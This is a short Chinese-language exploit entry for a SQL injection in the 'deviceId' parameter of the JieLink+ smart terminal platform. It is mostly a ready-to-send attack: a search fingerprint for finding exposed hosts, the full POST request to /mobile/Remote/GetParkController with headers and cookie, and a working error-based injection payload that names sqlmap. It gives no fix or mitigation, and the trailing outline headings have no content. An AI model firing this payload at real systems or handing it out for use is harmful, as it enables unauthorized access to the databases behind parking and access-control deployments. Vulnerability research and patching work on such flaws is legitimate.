# JieLink+智能终端操作平台deviceId存在SQL注入漏洞

- **系统**：JieLink+智能终端操作平台　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`title="JieLink+智能终端操作平台"`
- **请求**：`POST /mobile/Remote/GetParkController HTTP/1.1`
- **关键头**：`Host: {hostname}`　`X-Requested-With: XMLHttpRequest`　`Cookie: DefaultSystem=Mobile; ASP.NET_SessionId=533gfzuselgriachdgogkug5`　`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 66`

**请求体 / payload**
```
deviceId=1' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a786a71,(SELECT (ELT(3374=3374,1))),0x716b786b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- lMPS

sqlmap
POST /mobile/Remote/GetParkController HTTP/1.1
Host: {hostname}
X-Requested-With: XMLHttpRequest
Cookie: DefaultSystem=Mobile; ASP.NET_SessionId=533gfzuselgriachdgogkug5
Content-Type: application/x-www-form-urlencoded
Content-Length: 66
deviceId=1
```

**其他**
- JieLink+智能终端操作平台deviceId存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * JieLink+智能终端操作平台